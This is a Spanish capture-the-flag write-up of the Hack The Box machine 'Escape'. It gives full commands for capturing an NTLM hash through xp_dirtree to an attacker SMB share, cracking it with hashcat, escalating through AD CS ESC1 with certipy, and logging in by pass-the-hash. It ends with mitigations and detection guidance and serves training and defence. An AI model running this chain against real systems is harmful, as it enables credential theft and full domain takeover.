---
machine: Escape
os: Windows
difficulty: Medium
platform: Hack The Box
category: Active Directory / Windows
state: Retired
tags: [windows, active-directory, mssql, ntlm-capture, adcs, esc1, certipy]
---

# Escape — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

El share `Public` se abre como invitado y contiene `SQL Server Procedures.pdf`, un "manual" con credenciales de MSSQL. `PublicUser` no es `sysadmin` ni puede usar `xp_cmdshell`, pero sí `xp_dirtree`: se apunta a un share propio y el servicio SQL se autentica, entregando el hash NTLMv2 de `sql_svc`. Crackeado, ese usuario llega al backup `ERRORLOG.BAK`, que filtra la contraseña de `Ryan.Cooper`. Ryan es un usuario de dominio y la CA tiene la plantilla **`UserAuthentication` con ESC1**: se pide un certificado con el UPN de `Administrator`, se autentica con él y se obtiene su hash.

## Reconocimiento

```bash
nmap -p- --min-rate 5000 -T4 <IP> -oN nmap_all.txt
nmap -p 53,88,135,139,389,445,464,593,636,1433,3268,3269,5985 -sCV <IP> -oN nmap_svc.txt
```

```text
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn
389/tcp   open  ldap          Microsoft Windows AD LDAP (Domain: sequel.htb)
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
636/tcp   open  ssl/ldap
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00
3268/tcp  open  ldap          Global Catalog
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
```

`MSSQL` y `WinRM` en el mismo host: el primero da el hash, el segundo el acceso final.

```bash
echo "<IP> sequel.htb dc.sequel.htb" | sudo tee -a /etc/hosts
```

## Enumeración

```bash
smbclient -L //<IP> -N
smbclient //<IP>/Public -N
# get "SQL Server Procedures.pdf"
```

El PDF está pensado para administradores y trae credenciales de conexión a la instancia: usuario SQL **`PublicUser`**.

```bash
impacket-mssqlclient <IP> -u PublicUser -p '<PASSWORD>'
```

Comprobaciones dentro de la instancia:

```sql
SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';       -- denegado para este login
```

`PublicUser` no es `sysadmin` y `xp_cmdshell` está fuera de alcance, pero `xp_dirtree` sí está disponible: es una llamada a una ruta UNC y el servicio SQL se autentica contra ella.

## Foothold

Captura del hash con un share SMB propio:

```bash
impacket-smbserver share /tmp/share -smb2support
# en la sesión SQL:
EXEC master..xp_dirtree '\\<LHOST>\share\a';
```

El hash NTLMv2 de la cuenta de servicio aparece en el servidor SMB y se crackea fuera de línea:

```bash
hashcat -m 5600 sql_svc.hash rockyou.txt
impacket-mssqlclient <IP> -u sql_svc -p '<PASSWORD>'
```

## Movimiento lateral

Con `sql_svc` se lee el backup del errorlog de la instancia (`ERRORLOG.BAK`), que incluye la contraseña de **`Ryan.Cooper`** en una entrada de conexión. Es el patrón clásico: el log que "solo sirve para depurar" contiene credenciales.

```bash
nxc smb <IP> -u Ryan.Cooper -p '<PASSWORD>'
```

## Escalada de privilegios

Enumeración de AD CS:

```bash
certipy find -u Ryan.Cooper@sequel.htb -p '<PASSWORD>' -dc-ip <IP> -vulnerable -stdout
```

La plantilla **`UserAuthentication`** cumple ESC1: `Domain Users` puede inscribirse, admite *Client Authentication* y permite que el solicitante especifique el sujeto del certificado (`ENROLLEE_SUPPLIES_SUBJECT`). Eso convierte a cualquier usuario en cualquier otro:

```bash
certipy req -u Ryan.Cooper@sequel.htb -p '<PASSWORD>' \
  -ca '<CA_NAME>' -template UserAuthentication \
  -upn administrator@sequel.htb -dc-ip <IP>
```

```bash
certipy auth -pfx administrator.pfx -dc-ip <IP>
```

`certipy auth` devuelve el hash NTLM de `Administrator` (PKINIT + UnPAC-the-hash). Con él:

```bash
evil-winrm -i <IP> -u Administrator -H <NTLM_HASH>
```

Si el `-upn` no resuelve al objeto destino, `-sid S-1-5-21-...-500` fija el RID del Administrator real; no es obligatorio en el caso normal.

## Evidencia

- Salidas recortadas de la captura del hash, `certipy find` y `certipy auth`.
- Sin flags, hashes ni contraseñas: los valores reales viven en `private/`.

## Lecciones aprendidas

- Un PDF en un share "público" es documentación interna: se lee entero.
- `xp_dirtree` es una salida a red desde SQL aunque no haya `xp_cmdshell`.
- El hash de una cuenta de servicio vale más que el propio SQL: se reutiliza en SMB/WinRM.
- Los backups de logs conservan credenciales que el log rotado ya no muestra.
- ESC1 no necesita ser admin: basta con que `Domain Users` pueda inscribirse en una plantilla con *supplied subject*.

## Mitigaciones y detección

- Quitar `xp_dirtree`/`xp_fileexist` a logins de aplicación y bloquear salida SMB desde el servidor SQL.
- Cuentas de servicio con gMSA y contraseñas de 120 caracteres: el crackeo deja de ser viable.
- No dejar backups de logs en rutas accesibles al servicio; rotarlos y sanearlos.
- En AD CS: quitar `ENROLLEE_SUPPLIES_SUBJECT` de las plantillas con Client Authentication y restringir la inscripción a grupos concretos; auditar con `certipy find -vulnerable`.
- Detección: 4662 sobre la CA, peticiones de certificado con UPN distinto del solicitante (4886/4887 y logs de CA), y autenticación PKINIT inusual (4768 con `Certificate Information`).

MITRE: T1557 (AiTM), T1558.003 (kerberoasting), T1649 (steal or forge certificates), T1550.002 (pass the hash).

## Referencias

- <https://www.hackthebox.com/machines/escape>
- <https://adityatelange.in/writeups/hackthebox/escape>
- <https://chaelsoo.me/writeups/htb-escape>
- <https://github.com/ly4k/Certipy>
- <https://learn.microsoft.com/en-us/defender-for-identity/security-alert-certificate-services>
